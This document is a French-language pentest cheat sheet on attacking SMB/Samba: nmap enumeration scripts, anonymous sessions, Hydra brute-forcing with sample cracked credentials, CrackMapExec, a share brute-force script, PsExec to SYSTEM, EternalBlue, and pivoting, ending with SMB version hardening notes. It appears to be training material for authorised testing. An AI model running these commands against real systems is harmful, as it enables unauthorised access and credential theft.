# 📁 Énumération SMB/Samba

[← Retour à la table des matières](../README.md)

## 📋 Table des Matières
- [Nmap Scripts SMB](#nmap-scripts-smb)
- [Sessions Anonymes et Guest](#sessions-anonymes-et-accès-guest)
- [Enum4linux](#enum4linux)
- [Bruteforce avec Hydra](#hydra-bruteforce)
- [Samba sur Linux](#samba-sur-linux)
- [CrackMapExec](#crackmapexec---énumération-des-shares)
- [Connexion aux Shares](#connexion-aux-shares)
- [Méthodologie Complète](#méthodologie-dattaque-smb-complète)
- [PsExec](#smb-avec-psexec)
- [MS17-010 EternalBlue](#ms17-010-eternalblue)
- [Versions SMB et Sécurité](#versions-smb-et-sécurité)

## Port par défaut : 445

## Nmap Scripts SMB

### Scripts d'énumération de base
```bash
# Identification des protocoles SMB supportés
nmap -p445 --script smb-protocols targetIP

# Analyse du niveau de sécurité SMB
nmap -p445 --script smb-security-mode targetIP

# Énumération des sessions actives
nmap -p445 --script smb-enum-sessions targetIP

# Énumération des partages disponibles
nmap -p445 --script smb-enum-shares targetIP

# Découverte de l'OS via SMB
nmap --script smb-os-discovery.nse -p 445 targetIP

# Énumération des utilisateurs (nécessite souvent des credentials)
nmap -p445 --script smb-enum-users.nse targetIP
```

### Scan complet avec détection de version
```bash
# Énumération complète des services SMB/NetBIOS
nmap -sV -p 139,445 targetIP
```

## Metasploit Modules
```bash
use scanner/smb/smb_enumusers
use scanner/smb/smb_login
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version
```

## Sessions anonymes et accès guest

### Test d'accès anonyme
```bash
# Liste des partages en mode anonyme
smbclient -L targetIP -N

# Connexion RPC anonyme
rpcclient -U "" -N targetIP

# Test d'accès guest (appuyer sur Entrée pour le mot de passe)
smbclient -L targetIP
```

### Vérification des sessions nulles
Les sessions nulles permettent l'accès anonyme aux ressources SMB. Configuration dangereuse mais parfois présente sur les systèmes mal configurés.

```bash
# Test de connexion avec utilisateur vide
smbclient //targetIP/IPC$ -U ""
```

## Enum4linux
```bash
enum4linux -a targetIP
```

## Hydra Bruteforce → [📖 Guide Hydra](../06-tools/hydra.md)
```bash
# Bruteforce SMB
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

## Samba sur Linux

### Énumération avec smbmap
```bash
# Énumération des shares avec credentials
smbmap -H targetIP -u username -p password

# Énumération anonyme
smbmap -H targetIP -u anonymous
```

### Bruteforce Samba avec Hydra
```bash
# Bruteforce spécifique pour Samba Linux
hydra -L users.txt -P passwords.txt targetIP smb
# ⚠️ Réduire les threads si nécessaire : -t 3
```

## CrackMapExec - Énumération des shares → [📖 Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Vérifier les permissions des shares avec des credentials
crackmapexec smb targetIP -u administrator -p password --shares
```

## Connexion aux shares → [📖 Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion au share C$ (nécessite des privilèges admin)
smbclient //targetIP/C$ -U administrator

# Connexion à un share spécifique
smbclient //targetIP/sharename -U username
```

## Méthodologie d'attaque SMB complète

### Étape 1 : Bruteforce initial → [📖 Guide Hydra](../06-tools/hydra.md)
```bash
# Découverte des credentials avec Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

**Résultats typiques :**
```
[445][smb] host: targetIP   login: rooty   password: spongebob
[445][smb] host: targetIP   login: demo   password: password1
[445][smb] host: targetIP   login: auditor   password: hellokitty
[445][smb] host: targetIP   login: administrator   password: pineapple
```

### Étape 2 : Énumération des shares par utilisateur → [📖 Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Tester chaque credential trouvé pour lister les shares
crackmapexec smb targetIP -u rooty -p spongebob --shares
crackmapexec smb targetIP -u demo -p password1 --shares
crackmapexec smb targetIP -u auditor -p hellokitty --shares
crackmapexec smb targetIP -u administrator -p pineapple --shares
```

### Étape 3 : Connexion et exploration → [📖 Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion avec le compte ayant le plus de privilèges (généralement administrator)
smbclient //targetIP/C$ -U administrator

# Si C$ n'est pas accessible, tester d'autres shares découverts
smbclient //targetIP/Users -U username
smbclient //targetIP/shared -U username
```

### Étape 4 : Commandes dans smbclient
```bash
# Une fois connecté au share SMB :
ls                    # Lister les fichiers
cd directory         # Changer de répertoire
get filename         # Télécharger un fichier
put localfile        # Upload un fichier
mget *.txt          # Télécharger plusieurs fichiers
recurse ON          # Activer la récursion
prompt OFF          # Désactiver les confirmations
mget *              # Télécharger tout récursivement
```

## Analyse des permissions

### Interprétation des résultats CrackMapExec
```bash
# Exemple de sortie crackmapexec --shares :
# ADMIN$    Disk      Remote Admin           READ,WRITE
# C$        Disk      Default share          READ,WRITE  
# IPC$      IPC       Remote IPC             READ
# Users     Disk      Users Directory        READ
```

**Légende des permissions :**
- `READ` : Lecture seule
- `WRITE` : Écriture possible
- `READ,WRITE` : Accès complet
- `NO ACCESS` : Aucun accès

### Priorités d'exploration
1. **C$** : Accès au système de fichiers complet (admin requis)
2. **ADMIN$** : Répertoire Windows/System32 (admin requis)  
3. **Users** : Répertoires utilisateurs (souvent accessible)
4. **Shares personnalisés** : Peuvent contenir des données sensibles

## Script de bruteforce des shares
```bash
#!/bin/bash
TARGET="targetIP"
WORDLIST="/root/Desktop/wordlists/shares.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

## SMB avec PsExec (nécessite des credentials légitimes)

### Test de login SMB
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
```

### PsExec avec Impacket
```bash
# Exécution directe
psexec.py administrator@targetIP cmd.exe
```

### PsExec avec Metasploit
```bash
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password1  # Utiliser le mot de passe découvert
exploit
# Obtention d'un meterpreter avec privilèges SYSTEM
```

**Fonctionnement de PsExec :**
- Utilise des credentials d'administrateur valides pour l'exécution de code
- Similaire à l'utilitaire SysInternals PsExec
- Crée un service avec nom et description aléatoires
- Nettoyage automatique après exploitation
- Résultat : Session Meterpreter avec privilèges NT AUTHORITY\SYSTEM

## MS17-010 EternalBlue

### Détection de la vulnérabilité
```bash
# Nmap script de détection
nmap -sV -p 445 --script=smb-vuln-ms17-010 targetIP

# Scanner Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS targetIP
run
```

### Exploitation EternalBlue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS targetIP
run
```

## Accès aux Réseaux Internes via SMB

Une fois que tu as compromis une machine avec SMB, tu peux accéder aux réseaux internes.

**→ [📖 Guide Complet du Pivoting](../05-post-exploitation/pivoting-metasploit.md)**

### Commandes rapides pour l'accès réseau
```bash
# Migration vers processus utilisateur (si nécessaire)
migrate -N explorer.exe

# Test d'accès aux ressources internes
shell
net view IP_CIBLE_INTERNE

# Mappage de lecteurs réseau
net use D: \\IP_CIBLE_INTERNE\Documents
net use K: \\IP_CIBLE_INTERNE\C$
```

## Versions SMB et Sécurité

### Analyse des versions SMB
```bash
# Identification des protocoles supportés
nmap -p445 --script smb-protocols targetIP
```

### Contexte sécuritaire des versions SMB

#### SMBv1 (Extrêmement dangereux)
- **Développé** : Années 1980 (plus de 30 ans)
- **Vulnérabilités** : Exploité par WannaCry et autres ransomwares
- **Manques de sécurité** :
  - Pas d'intégrité pré-authentification
  - Négociation de dialecte non sécurisée
  - Pas de chiffrement
  - Connexions guest non sécurisées
- **Recommandation** : Désactiver impérativement

#### SMBv2/SMBv3 (Versions modernes)
- **Protections** : Chiffrement, intégrité pré-authentification
- **Sécurité** : Négociation sécurisée, désactivation des connexions guest dangereuses
- **Versions** : SMB 2.0, 2.1, 3.0, 3.0.2, 3.1.1

### Configuration et désactivation SMB
Les versions SMB peuvent être activées/désactivées via les registres Windows. SMBv1 reste présent même sur les OS récents mais peut être désactivé.